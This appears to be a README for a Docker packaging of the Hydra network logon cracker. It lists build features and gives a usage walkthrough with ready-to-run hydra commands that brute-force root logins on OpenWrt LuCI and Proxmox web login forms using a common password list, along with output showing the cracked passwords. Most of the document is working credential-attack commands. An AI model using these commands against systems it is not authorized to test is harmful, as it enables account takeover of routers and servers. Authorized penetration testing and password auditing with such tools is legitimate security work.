hydra
=====

[hydra][1] is a very fast network logon cracker which support many different services.

- [x] openssl
- [x] idn
- [x] curses
- [x] pcre
- [x] Postgres
- [x] SVN
- [ ] firebird
- [x] MYSQL client
- [ ] AFP
- [ ] NCP
- [ ] SAP/R3
- [x] libssh
- [ ] Oracle
- [ ] GUI req's
- [x] Android specialities
- [x] secure compile option support in gcc

# up and running

```bash
$ docker-compose up -d

$ docker-compose exec hydra bash

# https://github.com/danielmiessler/SecLists
>>> cat passwords.lst
    123456
    admin
    secret
    ...

# Manual
>>> hydra -U http-post-form

# OpenWrt
>>> hydra -vVf -t 1 -l root -P passwords.lst -o results.txt "http-post-form://192.168.1.1:80/cgi-bin/luci/:luci_username=^USER^&luci_password=^PASS^:F=Forbidden"
    [80][http-post-form] host: 192.168.1.1   login: root   password: admin
    1 of 1 target successfully completed, 1 valid password found

# Proxmox
>>> hydra -vVf -t 1 -l root -P passwords.lst -o results.txt "https-post-form://192.168.1.1:8006/api2/extjs/access/ticket:username=^USER^&password=^PASS^&realm=pam&new-format=1:F=failure"

>>> cat results.txt
    [80][http-post-form] host: 192.168.1.1   login: root   password: admin
    [8006][http-post-form] host: 192.168.1.1   login: root   password: secret
```

> [!Tip]
> View more [examples][4]

[1]: https://github.com/vanhauser-thc/thc-hydra
[2]: https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra-http-form.c
[3]: https://www.kali.org/tools/hydra/
[4]: https://github.com/Ilias1988/Hacking-Cheatsheets/blob/main/Hydra/README.md
